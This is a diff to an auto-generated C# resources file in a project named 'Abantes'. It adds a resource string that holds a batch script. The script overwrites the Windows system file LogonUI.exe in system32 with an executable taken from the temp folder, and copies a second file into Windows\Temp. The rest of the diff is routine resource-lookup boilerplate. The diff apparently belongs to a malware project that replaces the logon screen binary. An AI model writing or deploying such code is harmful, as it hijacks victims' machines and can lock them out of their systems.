@@ -59,5 +59,26 @@ namespace Abantes.Properties {
                 resourceCulture = value;
             }
         }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to .
+        /// </summary>
+        internal static string Action {
+            get {
+                return ResourceManager.GetString("Action", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to @echo on
+        ///cd\
+        ///copy %temp%\LogonUIStart.exe &quot;C:\Windows\system32\LogonUI.exe&quot; /Y
+        ///copy %temp%\LogonUi.exe &quot;C:\Windows\Temp\LogonUi.exe&quot; /Y.
+        /// </summary>
+        internal static string LogonOverwrite {
+            get {
+                return ResourceManager.GetString("LogonOverwrite", resourceCulture);
+            }
+        }
     }
 }
